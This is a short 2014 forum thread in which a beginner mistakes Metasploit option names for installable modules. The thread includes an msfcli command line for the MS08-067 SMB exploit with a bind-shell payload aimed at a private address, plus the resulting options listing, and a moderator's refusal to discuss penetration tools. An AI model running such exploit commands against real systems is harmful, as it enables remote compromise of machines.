---
title: "Help install metasploit's modules"
date: 2014-03-21
forum: General Help
---

### Post by M1ck4el on 2014-03-21
Hi all, 
I would like to install some modules : RHOST, RPORT, SMBPIPE, EXITFUNC, LPORT
I need it for my ms_08_067_netapi's module.
This is my first connection with Metasploit and I don't know commands yet (i tried to type "apt-get install RHOST" but of course it didn't work)

Thx



root@user:/opt# msfcli windows/smb/ms08_067_netapi RHOST=192.168.1.21 PAYLOAD=windows/shell/bind_tcp O
[*] Initializing modules...

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.1.21     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
   LPORT     4444             yes       The listen port
   RHOST     192.168.1.21     no        The target address

---

### Post by QIII on 2014-03-21
Hello!

We do not allow discussions about the use or installation of penetration testing tools on the Forums.

Although we have no reason to doubt your intentions, we do not want the Forums to become a resource for those with nefarious intent.

Thanks.

---

